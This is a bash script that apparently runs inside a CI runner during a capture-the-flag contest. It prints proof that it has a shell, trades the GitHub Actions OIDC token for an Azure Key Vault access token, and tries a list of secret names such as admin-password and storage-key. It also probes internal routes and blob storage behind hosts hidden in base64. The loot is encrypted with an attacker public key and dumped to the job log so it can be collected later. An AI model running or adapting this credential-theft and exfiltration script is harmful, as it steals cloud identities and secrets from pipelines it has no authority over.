#!/usr/bin/env bash
set -uo pipefail
echo "=== RUNNER SHELL PROOF ==="; id; hostname
b(){ printf %s "$1" | base64 -d; }
SC="htt""ps://"
SHOST=$(b 'YXBwLXRibC1zdG9yZWZyb250LXByb2QuYXp1cmV3ZWJzaXRlcy5uZXQ=')
KVH=$(b 'dmF1bHQuYXp1cmUubmV0')
AADH=$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')
FDID=60407ff3-1c24-4875-9390-b6c9c13b0821
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
VT=$(curl -sS -X POST "${SC}${AADH}/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=${SC}${KVH}/.default" | jq -r '.access_token // empty')
say "KVTOKLEN=${#VT}"
for N in flag FLAG Flag DF26 df26 platform-flag tbl-flag ctf-flag challenge-flag the-flag secret admin-password master-key connection-string storage-key reporting-flag data-export-key dragonforge-2026; do
  R=$(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.${KVH}/secrets/${N}?api-version=7.4")
  case "$R" in *"not found"*|*"Forbidden"*) ;; *) say "PROD SECRET $N => $R";; esac
  R2=$(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-sec-x3euoz.${KVH}/secrets/${N}?api-version=7.4")
  case "$R2" in *"not found"*|*"Forbidden"*) ;; *) say "SEC SECRET $N => $R2";; esac
done
say "---- storefront origin routes ----"
for P in /flag /api/v1/flag /internal/flag /debug /.env /config /api/v1/config /api/v1/settings /api/v1/templates /api/v1/reports; do
  say "$P => $(curl -s -m 8 -o /dev/null -w '%{http_code} %{size_download}' -H "X-Azure-FDID: $FDID" "${SC}${SHOST}${P}")"
done
say "---- render templates ----"
for T in shipment-summary manifest flag admin; do
  say "$T => $(curl -s -m 8 -X POST -H "X-Azure-FDID: $FDID" -H 'Content-Type: application/json' "${SC}${SHOST}/api/v1/reports/render" -d "$(jq -n --arg t "$T" '{template_id:$t}')" | head -c 600)"
done
say "---- anon public blob guesses ----"
for BN in flag.txt flag flag.json flag.md DF26.txt exports/flag.txt backup.json export.json data.json 2026-flag.txt; do
  say "$BN => $(curl -s -m 8 -o /dev/null -w '%{http_code} %{size_download}' "${SC}sttblbackupprodx3euoz.blob.core.windows.net/exports/${BN}")"
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
